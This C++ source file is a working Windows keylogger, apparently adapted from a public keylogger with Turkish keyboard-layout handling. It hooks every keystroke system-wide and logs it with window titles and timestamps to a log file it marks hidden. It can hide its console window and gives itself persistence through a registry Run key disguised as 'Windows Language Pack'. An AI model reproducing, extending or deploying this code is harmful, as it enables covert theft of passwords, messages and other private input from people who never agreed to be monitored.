#include <Windows.h>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <shlobj_core.h>
#include <map>

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)
// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0
// defines if ignore mouseclicks
#define mouseignore
// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

#if FORMAT == 0
const std::map<int, std::string> keyname{
	{VK_BACK, "[BACKSPACE]" },
	{VK_RETURN,	"\n" },
	{VK_SPACE,	"_" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		LPCWSTR a = L"Failed to install hook!";
		LPCWSTR b = L"Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}


int Save(int key_stroke)
{
	std::stringstream output;
	static char lastwindow[256] = "";
#ifndef mouseignore 
	if ((key_stroke == 1) || (key_stroke == 2))
	{
		return 0; // ignore mouse clicks
	}
#endif
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground)
	{
		// get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0)
		{
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);

			// get time
			time_t t = time(NULL);
			struct tm tm;
			localtime_s(&tm, &t);
			char s[64];
			strftime(s, sizeof(s), "%c", &tm);

			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
		}
	}

#if FORMAT == 10
	output << '[' << key_stroke << ']';
#elif FORMAT == 16
	output << std::hex << "[" << key_stroke << ']';
#else
	if (keyname.find(key_stroke) != keyname.end())
	{
		output << keyname.at(key_stroke);
	}
	else
	{
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		if (key_stroke == 222) {
			key = 'İ';
		}
		else if (key_stroke == 221) {
			key = 'Ü';
		}
		else if (key_stroke == 220) {
			key = 'Ç';
		}
		else if (key_stroke == 219) {
			key = 'Ğ';
		}
		else if (key_stroke == 191) {
			key = 'Ö';
		}
		else if (key_stroke == 186) {
			key = 'Ş';
		}
		else {
			key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
		}
		// tolower converts it to lowercase properly
		if (!lowercase)
		{
			if (key == 'I') {
				key = 'ı';
			}
			if (key == 'İ') {
				key = 'i';
			}
			else {
				key = tolower(key);
			}
		}
		output << key;
	}
#endif
	// instead of opening and closing file handlers every time, keep file open and flush.
	output_file << output.str();
	output_file.flush();

	std::cout << output.str();

	return 0;
}
void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif
}

void AutoRun() {

	LONG key;
	char re[MAX_PATH];
	std::string FP = std::string(re, GetModuleFileNameA(NULL, re, MAX_PATH));
	HKEY hkey;

	key = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", 0, KEY_SET_VALUE, &hkey);
	if (ERROR_SUCCESS == key)
	{
		key = RegSetValueExA(hkey, "Windows Language Pack", 0, REG_SZ, (BYTE*)FP.c_str(), FP.size()+1);
		RegCloseKey(hkey);
	}
	else {
		std::cout << key;
	}
}

int main()
{
	setlocale(LC_ALL, "Turkish");

	char* username = nullptr;
	size_t sz = 0;
	std::string path_with_filename;
	if (_dupenv_s(&username, &sz, "USERPROFILE") == 0 && username != nullptr)
	{
		const char* output_filename = "\\Documents\\configLoR.log";
		path_with_filename = std::string(username) + output_filename;
	}
	else {
		path_with_filename = "configLoR.log";
	}
	std::cout << "Logging output to " << path_with_filename << std::endl;

	// open output file in append mode
	output_file.open(path_with_filename, std::ios_base::app);

	//make file hidden
	int attr = GetFileAttributesA(path_with_filename.c_str());
	if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
		SetFileAttributesA(path_with_filename.c_str(), attr | FILE_ATTRIBUTE_HIDDEN);
		std::cout << "gizledim dosyayı adamım";
	}
	else {
		std::cout << "dosya gizlenmiş adamım";
	}

	// visibility of window
	Stealth();

	//For auto start
	AutoRun();

	// set the hook
	SetHook();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}
